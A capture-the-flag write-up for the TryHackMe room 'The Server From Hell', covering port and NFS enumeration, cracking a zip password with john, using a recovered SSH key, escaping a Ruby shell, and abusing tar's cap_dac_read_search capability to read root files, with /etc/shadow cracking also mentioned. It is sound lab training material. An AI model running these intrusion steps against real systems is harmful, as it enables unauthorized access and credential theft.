> the server from hell | tryhackme 

this room covers :
------

- nfs enumeration to get ssh keys
- ports enumeration to check what is valid
- cracking passwords 
- privilege escalation with capabilities

![image](https://user-images.githubusercontent.com/67979878/135375594-513fd7df-c421-440a-b03b-1a5af3f2eabc.png)


> export IP=10.10.25.107

description : ' Start at port 1337 and enumerate your way.'

```bash
sudo nmap -vv $IP -oN nmap/intial   # stealth scan to be fast :D
```

$ nc 10.10.25.107 1337 

```
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports    
```

```bash

$ for i in {1..100} ; do nc $IP $i;done 
```
output contain :go to port 12345

$ nc $IP 12345

```
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan 
```

nfs is indicated with rpc on port 111 

from nmap scan :
```
111/tcp   open  rpcbind              syn-ack ttl 63

```

$ sudo nmap -vv -sV $IP -p 111 --script=rpcinfo      

```bash
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
```

```bash

showmount -e  $IP                                                                                                                                                                 
Export list for 10.10.25.107:
/home/nfs *

```

```bash

sudo mount -t nfs $IP:/home/nfs /tmp/nfs    

```

found backup.zip file , need password . 

```bash

zip2john backup.zip| tee hashed_nfs
john hashed_nfs  
# result : zxcvbnm          (backup.zip)
```

$ unzip -P 'zxcvbnm' backup.zip 

> found home folder extracted , .ssh directory contains :

```
-rw-r--r-- 1 kali kali  736 Sep 15  2020 authorized_keys
-rw-r--r-- 1 kali kali   33 Sep 15  2020 flag.txt
-rw-r--r-- 1 kali kali   10 Sep 15  2020 hint.txt
-rw------- 1 kali kali 3369 Sep 15  2020 id_rsa
-rw-r--r-- 1 kali kali  736 Sep 15  2020 id_rsa.pub
                                                         
```

> flag : [reducted]

```bash
$ cat hint.txt  
2500-4500
```

we have ssh keys and can notice username hades from home directory ,However when try ssh it return the connection was reset maybe the port is not 22 ?

looping through ports 2500-4500; port 3333 return ssh banner :D

ssh -i id_rsa hades@10.10.25.107 -p 3333 

found a weird shell :( 

```ruby
NameError (undefined local variable or method `id' for main:Object)
```
searching the error found out it a ruby shell we can execute a /bin/bash and get regular shell :


https://netsec.ws/?p=337

```ruby

exec "/bin/bash"

```

> user :[reducted]

hint for root : get cap 

```bash
getcap -r / 2>/dev/null
```

result :
```
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```

tar seems promising  , you can take the /etc/shadow instead of /root/root.txt then crack the password with john to get full access at the machine but that's enough 4 me to read the flag

using 
```bash
tar cvf flag.tar /root/root.txt
ls
tar -xvf flag.tar
```

we can read our flag :D 

> root : [reducted]


# done ^^
